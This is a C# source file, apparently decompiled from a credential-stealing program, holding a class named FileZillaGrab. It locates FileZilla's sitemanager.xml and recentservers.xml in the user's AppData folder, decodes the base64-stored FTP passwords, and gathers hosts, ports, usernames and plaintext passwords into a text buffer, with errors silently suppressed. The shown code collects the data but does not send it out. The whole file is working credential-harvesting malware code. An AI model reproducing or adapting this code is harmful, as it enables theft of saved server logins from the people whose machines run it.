using System;
using System.IO;
using System.Text;
using System.Xml;

namespace Recovery
{
	// Token: 0x02000005 RID: 5
	internal class FileZillaGrab
	{
		// Token: 0x0600000C RID: 12 RVA: 0x0000294C File Offset: 0x00000B4C
		public static StringBuilder Recovery(StringBuilder stringBuilder)
		{
			string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\";
			string text = str + "sitemanager.xml";
			string text2 = str + "recentservers.xml";
			bool flag = File.Exists(text2);
			if (flag)
			{
				try
				{
					XmlDocument xmlDocument = new XmlDocument();
					xmlDocument.Load(text2);
					foreach (object obj in xmlDocument.GetElementsByTagName("Server"))
					{
						XmlNode xmlNode = (XmlNode)obj;
						string str2 = string.Concat(new string[]
						{
							"ftp://",
							xmlNode["Host"].InnerText,
							":",
							xmlNode["Port"].InnerText,
							"/"
						});
						string innerText = xmlNode["User"].InnerText;
						string @string = Encoding.UTF8.GetString(Convert.FromBase64String(xmlNode["Pass"].InnerText));
						stringBuilder.Append("URL: " + str2 + "\n");
						stringBuilder.Append("USERNAME: " + innerText + "\n");
						stringBuilder.Append("PASSWORD: " + @string + "\n");
						stringBuilder.Append("=============================\n");
					}
				}
				catch
				{
				}
			}
			bool flag2 = File.Exists(text);
			if (flag2)
			{
				try
				{
					XmlDocument xmlDocument2 = new XmlDocument();
					xmlDocument2.Load(text);
					foreach (object obj2 in xmlDocument2.GetElementsByTagName("Server"))
					{
						XmlNode xmlNode2 = (XmlNode)obj2;
						string str3 = string.Concat(new string[]
						{
							"ftp://",
							xmlNode2["Host"].InnerText,
							":",
							xmlNode2["Port"].InnerText,
							"/"
						});
						string innerText2 = xmlNode2["User"].InnerText;
						string string2 = Encoding.UTF8.GetString(Convert.FromBase64String(xmlNode2["Pass"].InnerText));
						stringBuilder.Append("URL: " + str3 + "\n");
						stringBuilder.Append("USERNAME: " + innerText2 + "\n");
						stringBuilder.Append("PASSWORD: " + string2 + "\n");
						stringBuilder.Append("=============================\n");
					}
				}
				catch
				{
				}
			}
			return stringBuilder;
		}
	}
}
